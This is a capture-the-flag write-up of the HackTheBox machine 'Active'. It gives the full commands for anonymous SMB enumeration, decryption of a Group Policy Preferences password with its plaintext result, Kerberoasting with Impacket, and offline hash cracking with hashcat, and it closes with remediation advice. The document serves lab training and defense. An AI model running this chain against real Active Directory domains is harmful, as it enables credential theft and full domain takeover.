# HackTheBox — Active

**OS:** Windows Server 2008 R2 SP1  
**Difficulty:** Easy  
**Category:** Active Directory  
**IP:** 10.129.5.184  
**Domain:** active.htb  

---

## Summary

Active is a Windows Active Directory Domain Controller machine that demonstrates two classic and highly relevant attack techniques: **GPP (Group Policy Preferences) credential abuse** and **Kerberoasting**. The attack chain begins with anonymous SMB enumeration, leads to credential discovery via a leaked `Groups.xml` file, and escalates to full domain compromise through a Kerberoastable Administrator account.

---

## Enumeration

### Nmap

```bash
nmap -sC -sV 10.129.5.184
```

Key open ports confirm this is a Domain Controller:

| Port | Service |
|------|---------|
| 53   | DNS (Microsoft DNS 6.1.7601) |
| 88   | Kerberos |
| 135  | MSRPC |
| 389  | LDAP — Domain: active.htb |
| 445  | SMB |
| 3268 | LDAP (Global Catalog) |

LDAP enumeration reveals the domain name: `active.htb`. SMB signing is enabled and required, ruling out relay attacks.

---

### SMB Enumeration

```bash
smbmap -H 10.129.5.184
```

Anonymous (unauthenticated) enumeration reveals one accessible share:

```
Replication    READ ONLY
```

All other shares (ADMIN$, C$, SYSVOL, NETLOGON, Users) require authentication. The `Replication` share is a misconfigured SYSVOL replica accessible without credentials.

---

### Replication Share — Recursive Listing

```bash
smbmap -H 10.129.5.184 -r Replication --depth 10
```

Navigating the SYSVOL-style directory structure leads to a critical file:

```
Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

---

## Foothold — GPP Password Decryption

### Groups.xml

```bash
cat Groups.xml
```

The file contains a Group Policy Preferences entry for the user `active.htb\SVC_TGS` with an encrypted `cpassword` field.

```xml
<User name="active.htb\SVC_TGS"
      cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
      userName="active.htb\SVC_TGS"/>
```

GPP passwords are encrypted with AES-256, but Microsoft published the static decryption key in their documentation (MS14-025). The tool `gpp-decrypt` decrypts it instantly:

```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

```
GPPstillStandingStrong2k18
```

### User Flag

With the recovered credentials, authenticate to the Users share:

```bash
smbclient //10.129.5.184/Users -U active.htb/SVC_TGS
```

Navigate to `SVC_TGS\Desktop\user.txt` to retrieve the user flag.

---

## Privilege Escalation — Kerberoasting

### SPN Discovery & TGS Request

With valid domain credentials, use Impacket's `GetUserSPNs.py` to enumerate accounts with registered Service Principal Names and request their TGS tickets:

```bash
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile hashes.txt
```

Output reveals a critical finding — the **Administrator** account has an SPN registered:

```
ServicePrincipalName    Name           MemberOf
active/CIFS:445         Administrator  CN=Group Policy Creator Owners,...
```

A domain administrator acting as a service account means cracking its TGS hash grants full domain access.

### Hash Cracking

The TGS-REP hash (Kerberos 5, etype 23) is written to `hashes.txt`. Crack it offline with hashcat:

```bash
hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The hash is cracked in approximately 35 seconds. Full domain administrator password recovered.

---

## Root Flag

Authenticate to the Users share as Administrator:

```bash
smbclient //10.129.5.184/Users -U active.htb/Administrator
```

Navigate to `Administrator\Desktop\root.txt` to retrieve the root flag. Machine fully compromised.

---

## Attack Chain

```
Anonymous SMB Access
        |
        v
Replication Share (READ ONLY)
        |
        v
Groups.xml — cpassword field
        |
        v
gpp-decrypt — SVC_TGS credentials
        |
        v
User Flag
        |
        v
Kerberoasting — Administrator SPN (active/CIFS:445)
        |
        v
TGS Hash — Hashcat crack
        |
        v
Administrator credentials — Full Domain Compromise
        |
        v
Root Flag
```

---

## Key Takeaways

**GPP Credential Exposure (MS14-025)**  
Microsoft deprecated password storage in Group Policy Preferences in 2014 after publishing the AES decryption key. Despite this, legacy deployments still contain `cpassword` fields in SYSVOL. Any domain user — or in this case, even an unauthenticated user — who can read SYSVOL can decrypt these passwords instantly. Remediation: remove all GPP-stored passwords and use LAPS for local account management.

**Kerberoasting**  
Any authenticated domain user can request a TGS ticket for any account with an SPN. The ticket is encrypted with the service account's NTLM hash and can be cracked offline. When a privileged account like Administrator has an SPN, a single cracked hash results in total domain compromise. Remediation: use long random passwords on service accounts, adopt Group Managed Service Accounts (gMSA), and never assign SPNs to privileged accounts.

**SYSVOL/Replication Share Permissions**  
The Replication share was accessible without authentication. While SYSVOL is readable by all domain users by design, anonymous access is a misconfiguration. Remediation: audit SMB share permissions and disable anonymous/guest access.

---

## Tools Used

- `nmap` — Port and service enumeration
- `smbmap` — SMB share enumeration
- `smbclient` — SMB file access
- `gpp-decrypt` — GPP AES password decryption
- `GetUserSPNs.py` (Impacket) — Kerberoasting / SPN enumeration
- `hashcat` — Offline hash cracking

---

*HackTheBox — Active | Pwned: March 19, 2026*
